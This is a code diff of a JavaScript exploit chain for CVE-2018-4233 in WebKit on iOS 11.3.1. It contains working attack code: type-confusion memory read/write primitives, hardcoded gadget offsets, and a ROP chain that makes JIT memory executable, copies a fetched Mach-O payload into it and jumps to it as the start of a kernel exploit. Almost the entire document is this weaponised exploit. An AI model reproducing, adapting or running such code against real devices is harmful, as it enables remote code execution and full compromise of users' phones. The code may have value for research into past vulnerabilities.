@@ -2,12 +2,13 @@
  * Exploit by @_niklasb from phoenhex.
  *
  * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
+ * The second stage is currently Ian Beer's empty_list kernel exploit,
+ * adapted to use getattrlist() instead of fgetattrlist().
  *
- * Adapted to run on earlier devices
- * Credits to saelo for r/w code etc
+ * Thanks to qwerty for some Mach-O tricks.
  *
+ * Offsets hardcoded for iPhone 8, iOS 11.3.1.
  */
-
 print = alert
 ITERS = 10000
 ALLOCS = 1000
@@ -45,20 +46,34 @@ function xor(a, b) {
     return res
 }
 
-function swap32(val) {
-    return ((val & 0xFF) << 24)
-           | ((val & 0xFF00) << 8)
-           | ((val >> 8) & 0xFF00)
-           | ((val >> 24) & 0xFF);
-}
-
 function fail(x) {
     print('FAIL ' + x)
     throw null
 }
 
-// CVE-2018-4233
+function make_compiled_function() {
+    function target(x) {
+        return x*5 + x - x*x;
+    }
+    // Call only once so that function gets compiled with low level interpreter
+    // but none of the optimizing JITs
+    target(0);
+    return target;
+}
+
+function boring_func() {
+    function target() {
+        var value = 0x13371337
+        return value
+    }
+    target()
+
+    return target
+}
+
 counter = 0
+
+// CVE-2018-4233
 function trigger(constr, modify, res, val) {
     return eval(`
     var o = [13.37]
@@ -83,10 +98,7 @@ function trigger(constr, modify, res, val) {
     `)
 }
 
-var shellcode_buffer
-var shellcode_length
-
-function pwn() {
+function pwn(binary) {
     var stage1 = {
         addrof: function(victim) {
             return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim))
@@ -141,6 +153,7 @@ function pwn() {
     var hax = new Uint8Array(0x1000);
 
     // Create fake JSObject.
+    // print("[*] Setting up container object");
 
     var jsCellHeader = new Int64([
         00, 0x10, 00, 00,       // m_structureID, current guess.
@@ -161,6 +174,7 @@ function pwn() {
 
     // Create the fake Float64Array.
     var address = Add(stage1.addrof(container), 16);
+    // print("[*] Fake JSObject @ " + address);
 
     var fakearray = stage1.fakeobj(address);
 
@@ -175,6 +189,9 @@ function pwn() {
         container.jsCellHeader = jsCellHeader.asJSValue();
     }
 
+    // Maybe shouldn't print stuff here.. :P
+    // print("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));
+
     //
     // We now have an arbitrary read+write primitive since we can overwrite the
     // data pointer of an Uint8Array with an arbitrary address.
@@ -183,6 +200,7 @@ function pwn() {
     //
     memory = {
         read: function(addr, length) {
+            // print("[<] Reading " + length + " bytes from " + hexit(addr));
             fakearray[2] = i2f(addr);
             var a = new Array(length);
             for (var i = 0; i < length; i++)
@@ -195,6 +213,7 @@ function pwn() {
         },
 
         write: function(addr, data) {
+            // print("[>] Writing " + data.length + " bytes to " + hexit(addr));
             fakearray[2] = i2f(addr);
             for (var i = 0; i < data.length; i++)
                 hax[i] = data[i];
@@ -225,12 +244,6 @@ function pwn() {
     // The fake array itself is rooted by the memory object (closures).
     fakearray.container = container;
 
-    // Time to do some ROP :-)
-    // wrapper->el_addr points straight to a vtab
-    // vtab->0x18 is called when you call `wrapper.addEventListener(...)`
-    // We can overwrite this pointer with an entry to our ROP chain 
-    // we have access to entirety of dyld shared cache, so it's all fun and -games- gadgets :-)
-
     var wrapper = document.createElement('div')
     var wrapper_addr = stage1.addrof(wrapper)
 
@@ -238,43 +251,133 @@ function pwn() {
     var vtab = memory.readInt64(el_addr)
 
     // regloader:
-    // e00317aa       mov x0, x23
-    // e10316aa       mov x1, x22
-    // e20318aa       mov x2, x24
-    // e30319aa       mov x3, x25
-    // e4031aaa       mov x4, x26
-    // e5031baa       mov x5, x27
-    // 80033fd6       blr x28
+    // 0x180ee6048      e00317aa       mov x0, x23
+    // 0x180ee604c      e10316aa       mov x1, x22
+    // 0x180ee6050      e20318aa       mov x2, x24
+    // 0x180ee6054      e30319aa       mov x3, x25
+    // 0x180ee6058      e4031aaa       mov x4, x26
+    // 0x180ee605c      e5031baa       mov x5, x27
+    // 0x180ee6060      80033fd6       blr x28
 
     // dispatch:
-    // a0023fd6       blr x21
-    // fd7b43a9       ldp x29, x30, [sp, 0x30]
-    // f44f42a9       ldp x20, x19, [sp, 0x20]
-    // f65741a9       ldp x22, x21, [sp, 0x10]
-    // ff030191       add sp, sp, 0x40
-    // c0035fd6       ret
+    // 0x180d62e48      a0023fd6       blr x21
+    // 0x180d62e4c      fd7b43a9       ldp x29, x30, [sp, 0x30]
+    // 0x180d62e50      f44f42a9       ldp x20, x19, [sp, 0x20]
+    // 0x180d62e54      f65741a9       ldp x22, x21, [sp, 0x10]
+    // 0x180d62e58      ff030191       add sp, sp, 0x40
+    // 0x180d62e5c      c0035fd6       ret
 
-    // stackloader:
-    // fd7b46a9       ldp x29, x30, [sp, 0x60]
-    // f44f45a9       ldp x20, x19, [sp, 0x50]
-    // f65744a9       ldp x22, x21, [sp, 0x40]
-    // f85f43a9       ldp x24, x23, [sp, 0x30]
-    // fa6742a9       ldp x26, x25, [sp, 0x20]
-    // fc6f41a9       ldp x28, x27, [sp, 0x10]
-    // ffc30191       add sp, sp, 0x70
-    // c0035fd6       ret
+    // stackloader
+    // 0x19331cfe0      fd7b46a9       ldp x29, x30, [sp, 0x60]
+    // 0x19331cfe4      f44f45a9       ldp x20, x19, [sp, 0x50]
+    // 0x19331cfe8      f65744a9       ldp x22, x21, [sp, 0x40]
+    // 0x19331cfec      f85f43a9       ldp x24, x23, [sp, 0x30]
+    // 0x19331cff0      fa6742a9       ldp x26, x25, [sp, 0x20]
+    // 0x19331cff4      fc6f41a9       ldp x28, x27, [sp, 0x10]
+    // 0x19331cff8      ffc30191       add sp, sp, 0x70
+    // 0x19331cffc      c0035fd6       ret
 
     // __longjmp:
-    // 135040a9       ldp x19, x20, [x0]
-    // 155841a9       ldp x21, x22, [x0, 0x10]
-    // 176042a9       ldp x23, x24, [x0, 0x20]
-    // 196843a9       ldp x25, x26, [x0, 0x30]
-    // 1b7044a9       ldp x27, x28, [x0, 0x40]
-    // 1d7845a9       ldp x29, x30, [x0, 0x50]
-    // 1d0846a9       ldp x29, x2, [x0, 0x60]
-    // ...
+    // 0x180700ad4      135040a9       ldp x19, x20, [x0]
+    // 0x180700ad8      155841a9       ldp x21, x22, [x0, 0x10]
+    // 0x180700adc      176042a9       ldp x23, x24, [x0, 0x20]
+    // 0x180700ae0      196843a9       ldp x25, x26, [x0, 0x30]
+    // 0x180700ae4      1b7044a9       ldp x27, x28, [x0, 0x40]
+    // 0x180700ae8      1d7845a9       ldp x29, x30, [x0, 0x50]
+    // 0x180700aec      1d0846a9       ldp x29, x2, [x0, 0x60]
 
-    var slide               = Sub(memory.readInt64(vtab), 0x186d68698); // WebCore -> __ZNK7WebCore4Node20eventTargetInterfaceEv
+    Int64.prototype.lo = function()
+    {
+        var b = this.bytes();
+        return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24))>>>0;
+    };
+    Int64.prototype.hi = function()
+    {
+        var b = this.bytes();
+        return (b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24))>>>0;
+    };
+    function fsyms(mem, base, want)
+    {
+        var stab = null;
+        var ncmds = mem.u32(Add(base, 0x10));
+        for(var i = 0, off = 0x20; i < ncmds; ++i)
+        {
+            var cmd = mem.u32(Add(base, off));
+            if(cmd == 0x2) // LC_SYMTAB
+            {
+                stab =
+                {
+                    symoff:  mem.u32(Add(base, off +  0x8)),
+                    nsyms:   mem.u32(Add(base, off +  0xc)),
+                    stroff:  mem.u32(Add(base, off + 0x10)),
+                    strsize: mem.u32(Add(base, off + 0x14)),
+                };
+                break;
+            }
+            off += mem.u32(Add(base, off + 0x4));
+        }
+        if(stab == null)
+        {
+            fail("stab");
+        }
+        var strs = mem.read(Add(base, stab.stroff), stab.strsize);
+        var syms = {};
+        for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
+        {
+            var strx = mem.u32(Add(base, stab.symoff + i * 0x10));
+            for(var j = 0; j < want.length; ++j)
+            {
+                var s = want[j];
+                var match = true;
+                for(var k = 0; k < s.length; ++k)
+                {
+                    if(strs[strx + k] != s.charCodeAt(k))
+                    {
+                        match = false;
+                        break;
+                    }
+                }
+                if(match && strs[strx + s.length] == 0)
+                {
+                    syms[s] = mem.readInt64(Add(base, stab.symoff + i * 0x10 + 0x8));
+                    want.splice(j, 1);
+                    break;
+                }
+            }
+        }
+        /*if(fileOff)
+        {
+            want = Object.keys(syms);
+            var real = {};
+            for(var i = 0, off = 0x20; i < ncmds && want.length > 0; ++i)
+            {
+                var cmd = mem.u32(Add(base, off));
+                if(cmd == 0x19) // LC_SEGMENT_64
+                {
+                    var vmaddr = mem.readInt64(Add(base, off + 0x18));
+                    var fileoff = mem.readInt64(Add(base, off + 0x28));
+                    var filesize = mem.readInt64(Add(base, off + 0x30));
+                    var vmend = Add(start, filesize);
+                    for(var j = 0; j < want.length; ++j)
+                    {
+                        var s = want[j];
+                        var ad = syms[s];
+                        var lo = ad.lo();
+                        var hi = ad.hi();
+                        if()
+                        {
+                            real[]
+                        }
+                    }
+                }
+                off += mem.u32(Add(base, off + 0x4));
+            }
+            syms = real;
+        }*/
+        return syms;
+    }
+
+    /*var slide               = Sub(memory.readInt64(vtab), 0x186d68698); // some ptr in WebCore (PrivateFrameworks one)
     var dlsym               = Add(0x18084ef90, slide);
     var longjmp             = Add(0x180700ad4, slide);
     var regloader           = Add(0x180ee6048, slide);
@@ -283,36 +386,122 @@ function pwn() {
     var mach_task_self      = Add(0x180623204, slide);
     var mach_vm_protect     = Add(0x18062315c, slide);
     var memmove             = Add(0x180700d60, slide);
-    var sleep               = Add(0x1805c9244, slide)
-    var memPoolEnd          = memory.readInt64(Add(0x1a79e69a0, slide));
+    var memPoolEnd          = memory.readInt64(Add(0x1a79e69a0, slide));*/
+    var slide               = Sub(memory.readInt64(vtab), 0x186d61698); // __ZNK7WebCore4Node20eventTargetInterfaceEv
+    var longjmp             = Add(0x180700ad4, slide);
+    var regloader           = Add(0x180ee6048, slide);
+    var dispatch            = Add(0x180d62e48, slide);
+    var stackloader         = Add(0x19331cfe0, slide);
+    var mach_task_self      = Add(0x180623204, slide);
+    var mach_vm_protect     = Add(0x18062315c, slide);
+    var memmove             = Add(0x180700d60, slide);
+    var sleep               = Add(0x1805c9244, slide);
+    var memPoolEnd          = memory.readInt64(Add(0x1a6b189a0, slide));
 
-    // ROP action plan:
-    // The exec JIT region is split into two vmaps, one --x and one -w-
-    // the location of the writable vmap is hidden behind some fancy memcpy shit 
-    // however we're nicely given the location of the --x region with the `*ofFixedExecutableMemoryPool` exports
-    // we can ROP into `mach_vm_protect` to turn the --x region into rwx (max is set to rwx, lol)
-    // then call `memmove` to move our shellcode from `shellcode_src` into `codeAddr`
-    // (`codeAddr` is alloc'd near the end of the --x region in order to have the least collisions with important things)
-    // then we can jump to `codeAddr` to exec our shellcode :-)
-    // `mach_vm_protect` requires `task`, so we must also call mach_task_self(...) 
+    // This is easier than Uint32Array and dividing offset all the time
+    binary.u32 = function(i){ if(i instanceof Int64) i = i.lo(); return this[i] | (this[i+1] << 8) | (this[i+2] << 16) | (this[i+3] << 24); };
+    binary.read = function(i, l) { if(i instanceof Int64) i = i.lo(); if(l instanceof Int64) l = l.lo(); return this.slice(i, i + l); };
+    binary.readInt64 = function(addr) { return new Int64(this.read(addr, 8)); };
+    binary.writeInt64 = function(i, val) { if(i instanceof Int64) i = i.lo(); this.set(val.bytes(), i); };
+    var pstart = new Int64('0xffffffffffffffff');
+    var pend   = new Int64(0);
+    var ncmds  = binary.u32(0x10);
+    for(var i = 0, off = 0x20; i < ncmds; ++i)
+    {
+        var cmd = binary.u32(off);
+        if(cmd == 0x19) // LC_SEGMENT_64
+        {
+            var vmstart = binary.readInt64(off + 0x18);
+            if(!(vmstart.hi() == 0 && vmstart.lo() == 0))
+            {
+                var vmend = Add(vmstart, binary.readInt64(off + 0x20));
+                if(vmstart.hi() < pstart.hi() || (vmstart.hi() == pstart.hi() && vmstart.lo() < pstart.lo()))
+                {
+                    pstart = vmstart;
+                }
+                if(vmend.hi() > pend.hi() || (vmend.hi() == pend.hi() && vmend.lo() > pend.lo()))
+                {
+                    pend = vmend;
+                }
+            }
+        }
+        off += binary.u32(off + 0x4);
+    }
+    var shsz = Sub(pend, pstart);
+    if(shsz.hi() != 0)
+    {
+        fail("shsz");
+    }
+    var payload = new Uint8Array(shsz.lo());
+    var paddr = memory.readInt64(Add(stage1.addrof(payload), 0x10));
+    var codeAddr = Sub(memPoolEnd, shsz);
+    codeAddr = Sub(codeAddr, codeAddr.lo() & 0x3fff);
+    var shslide = Sub(codeAddr, pstart);
+    var off = 0x20;
+    for(var i = 0; i < ncmds; ++i)
+    {
+        var cmd = binary.u32(off);
+        if(cmd == 0x19) // LC_SEGMENT_64
+        {
+            var vmaddr   = binary.readInt64(off + 0x18);
+            if(!(vmaddr.hi() == 0 && vmaddr.lo() == 0))
+            {
+                var vmsize   = binary.readInt64(off + 0x20);
+                var fileoff  = binary.readInt64(off + 0x28);
+                var filesize = binary.readInt64(off + 0x30);
+                if(vmsize.hi() < filesize.hi() || (vmsize.hi() == filesize.hi() && vmsize.lo() < filesize.lo()))
+                {
+                    filesize = vmsize;
+                }
+                if(fileoff.hi() != 0)
+                {
+                    fail("fileoff");
+                }
+                if(filesize.hi() != 0)
+                {
+                    fail("filesize");
+                }
+                fileoff = fileoff.lo();
+                filesize = filesize.lo();
+                payload.set(binary.slice(fileoff, fileoff + filesize), Sub(vmaddr, pstart).lo());
+                binary.writeInt64(off + 0x18, Add(vmaddr, shslide));
+            }
+        }
+        off += binary.u32(off + 0x4);
+    }
+    payload.set(binary.slice(0x20, off), 0x20);
 
-    memory.writeInt64(Add(vtab, 0x18), longjmp);            // first call will be to `longjmp`
+    memory.u32 = function(i){ var b = read(i, 4); return b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24); };
+    payload.u32 = function(i){ if(i instanceof Int64) i = i.lo(); return this[i] | (this[i+1] << 8) | (this[i+2] << 16) | (this[i+3] << 24); };
+    payload.read = function(i, l) { if(i instanceof Int64) i = i.lo(); if(l instanceof Int64) l = l.lo(); return this.slice(i, i + l); };
+    payload.readInt64 = function(addr) { return new Int64(this.read(addr, 8)); };
+    var psyms = fsyms(payload, 0, ["gaia"]);
+    if(psyms.gaia == null)
+    {
+        fail("gaia");
+    }
+    var jmpAddr = Add(psyms.gaia, shslide);
+
+    memory.writeInt64(Add(vtab, 0x18), longjmp);
     memory.writeInt64(Add(el_addr, 0x58), dispatch);        // x30 (gadget)
-    // call to mach_task_self to get current task into x0
     memory.writeInt64(Add(el_addr, 0x10), mach_task_self);  // x21 (func)
 
-    var arrsz = 0x10000,
-        off   =  0x1000;
-    var arr = new Uint32Array(arrsz);
-    var mem = memory.readInt64(Add(stage1.addrof(arr), 0x10));
+    var arrsz = 0x100000,
+        off   =   0x1000;
+    var arr   = new Uint32Array(arrsz);
+    var stack = memory.readInt64(Add(stage1.addrof(arr), 0x10));
 
-    var codeAddr = Sub(memPoolEnd, 0x1000000);
-
-    var shellcode_src = memory.readInt64(Add(stage1.addrof(shellcode_buffer), 0x10))
-    memory.writeInt64(Add(shellcode_src, 0x4), new Int64(dlsym))
+    /*
+    // shellcode
+    var shsz = 0x0;
+    //arr[shsz++] = 0xd65f03c0; // ret
+    arr[shsz++] = 0xd28ccc00; // movz x0, 0x6660
+    arr[shsz++] = 0xd61f0000; // br x0
+    shsz = new Int64(shsz * 4);
+    var codeAddr = Sub(memPoolEnd, shsz);
+    */
 
     var pos = arrsz - off;
-
     // after dispatch:
     arr[pos++] = 0xdead0000;                // unused
     arr[pos++] = 0xdead0001;                // unused
@@ -331,8 +520,6 @@ function pwn() {
     arr[pos++] = stackloader.lo();          // x30 (gadget)
     arr[pos++] = stackloader.hi();          // x30 (gadget)
 
-    // call to `mach_vm_protect` with our task already in x0 (7 = max prot)
-    // kern_return_t mach_vm_protect(task_t task, uint64_t address, size_t size, bool max, int prot);
     // in stackloader:
     arr[pos++] = 0xdead0010;                // unused
     arr[pos++] = 0xdead0011;                // unused
@@ -343,11 +530,11 @@ function pwn() {
     arr[pos++] = 0xdead0014;                // x27 == x5 (unused)
     arr[pos++] = 0xdead0015;                // x27 == x5 (unused)
     arr[pos++] = 7;                         // x26 == x4 (prot)
-    arr[pos++] = 7;                         // x26 == x4 (prot)
+    arr[pos++] = 0;                         // x26 == x4 (prot)
     arr[pos++] = 0;                         // x25 == x3 (max flag)
     arr[pos++] = 0;                         // x25 == x3 (max flag)
-    arr[pos++] = shellcode_length.lo();     // x24 == x2 (size)
-    arr[pos++] = shellcode_length.hi();     // x24 == x2 (size)
+    arr[pos++] = shsz.lo();                 // x24 == x2 (size)
+    arr[pos++] = shsz.hi();                 // x24 == x2 (size)
     arr[pos++] = 0xdead0016;                // x23 == x0 (skipped)
     arr[pos++] = 0xdead0017;                // x23 == x0 (skipped)
     arr[pos++] = codeAddr.lo();             // x22 == x1 (addr)
@@ -361,8 +548,9 @@ function pwn() {
     arr[pos++] = 0xdead001c;                // x29 (unused)
     arr[pos++] = 0xdead001d;                // x29 (unused)
     // Need to skip the first instruction (4 bytes) of regloader because we already have x0
-    arr[pos++] = Add(regloader, 0x4).lo();  // x30 (gadget)
-    arr[pos++] = Add(regloader, 0x4).hi();  // x30 (gadget)
+    var tmp = Add(regloader, 4);
+    arr[pos++] = tmp.lo();                  // x30 (gadget)
+    arr[pos++] = tmp.hi();                  // x30 (gadget)
 
     // after dispatch:
     arr[pos++] = 0xdead0020;                // unused
@@ -382,9 +570,6 @@ function pwn() {
     arr[pos++] = stackloader.lo();          // x30 (gadget)
     arr[pos++] = stackloader.hi();          // x30 (gadget)
 
-    // next call `memmove` to move our shellcode from `shellcode_src` into `codeAddr`
-    // (at the end of the exec JIT region, which is now rwx)
-    // void *memmove(void *dst, const void *src, size_t len);
     // in stackloader:
     arr[pos++] = 0xdead0030;                // unused
     arr[pos++] = 0xdead0031;                // unused
@@ -398,12 +583,12 @@ function pwn() {
     arr[pos++] = 0xdead0037;                // x26 == x4 (unused)
     arr[pos++] = 0xdead0038;                // x25 == x3 (unused)
     arr[pos++] = 0xdead0039;                // x25 == x3 (unused)
-    arr[pos++] = shellcode_length.lo();     // x24 == x2 (size)
-    arr[pos++] = shellcode_length.hi();     // x24 == x2 (size)
+    arr[pos++] = shsz.lo();                 // x24 == x2 (size)
+    arr[pos++] = shsz.hi();                 // x24 == x2 (size)
     arr[pos++] = codeAddr.lo();             // x23 == x0 (dst)
     arr[pos++] = codeAddr.hi();             // x23 == x0 (dst)
-    arr[pos++] = shellcode_src.lo();        // x22 == x1 (src)
-    arr[pos++] = shellcode_src.hi();        // x22 == x1 (src)
+    arr[pos++] = paddr.lo();                // x22 == x1 (src)
+    arr[pos++] = paddr.hi();                // x22 == x1 (src)
     arr[pos++] = memmove.lo();              // x21 (func)
     arr[pos++] = memmove.hi();              // x21 (func)
     arr[pos++] = 0xdead003a;                // x20 (unused)
@@ -433,8 +618,6 @@ function pwn() {
     arr[pos++] = stackloader.lo();          // x30 (gadget)
     arr[pos++] = stackloader.hi();          // x30 (gadget)
 
-    // make a call to `sleep(1)` -- weird exec stuff happens without this delay
-    // -shrug-
     // in stackloader:
     arr[pos++] = 0xdead0050;                // unused
     arr[pos++] = 0xdead0051;                // unused
@@ -466,38 +649,36 @@ function pwn() {
     arr[pos++] = regloader.hi();            // x30 (gadget)
 
     // after dispatch:
-    arr[pos++] = 0xdead0040;                // unused
-    arr[pos++] = 0xdead0041;                // unused
-    arr[pos++] = 0xdead0042;                // unused
-    arr[pos++] = 0xdead0043;                // unused
-    arr[pos++] = 0xdead0044;                // x22
-    arr[pos++] = 0xdead0045;                // x22
-    arr[pos++] = 0xdead0046;                // x21
-    arr[pos++] = 0xdead0047;                // x21
-    arr[pos++] = 0xdead0048;                // x20
-    arr[pos++] = 0xdead0049;                // x20
-    arr[pos++] = 0xdead004a;                // x19
-    arr[pos++] = 0xdead004b;                // x19
-    arr[pos++] = 0xdead774c;                // x29
-    arr[pos++] = 0xdead884d;                // x29
-    arr[pos++] = codeAddr.lo();             // x30 (shellcode)
-    arr[pos++] = codeAddr.hi();             // x30 (shellcode)
+    arr[pos++] = 0xdead0070;                // unused
+    arr[pos++] = 0xdead0071;                // unused
+    arr[pos++] = 0xdead0072;                // unused
+    arr[pos++] = 0xdead0073;                // unused
+    arr[pos++] = 0xdead0074;                // x22
+    arr[pos++] = 0xdead0075;                // x22
+    arr[pos++] = 0xdead0076;                // x21
+    arr[pos++] = 0xdead0077;                // x21
+    arr[pos++] = 0xdead0078;                // x20
+    arr[pos++] = 0xdead0079;                // x20
+    arr[pos++] = 0xdead007a;                // x19
+    arr[pos++] = 0xdead007b;                // x19
+    arr[pos++] = 0xdead007c;                // x29
+    arr[pos++] = 0xdead007d;                // x29
+    arr[pos++] = jmpAddr.lo();              // x30 (payload)
+    arr[pos++] = jmpAddr.hi();              // x30 (payload)
 
     // dummy
-    for (var i = 0; i < 0x20; ++i) {
+    for(var i = 0; i < 0x20; ++i)
+    {
         arr[pos++] = 0xdeadc0de;
     }
 
-    // stack pivot 
-    var sp = Add(mem, (arrsz - off) * 4);
-    memory.writeInt64(Add(el_addr, 0x68), sp); // x2 (copied into sp)
+    var sp = Add(stack, (arrsz - off) * 4);
+    memory.writeInt64(Add(el_addr, 0x68), sp);      // x2 (copied into sp)
 
-    // trigger the chain! 
-    wrapper.addEventListener('click', function() { })
+    // trigger
+    wrapper.addEventListener('click', function(){});
 
-    // queue: crashing, probably 
-
-    print("should never reach this")
+    print("should never reach this");
 }
 
 function print_error(e) {
@@ -505,18 +686,12 @@ function print_error(e) {
 }
 
 function go() {
-    fetch('/shellcode.bin').then((response) => {
+    fetch('payload').then((response) => {
         response.arrayBuffer().then((buffer) => {
             try {
-                // TODO: some more checks and shit 
-                shellcode_length = new Int64(buffer.byteLength)
-                if (shellcode_length > 0x1000000) {
-                    fail(5)
-                }
-                shellcode_buffer = new Uint32Array(buffer)
-                pwn()
+                pwn(new Uint8Array(buffer));
             } catch (e) {
-                print_error(e)
+                print_error(e);
             }
         })
     })
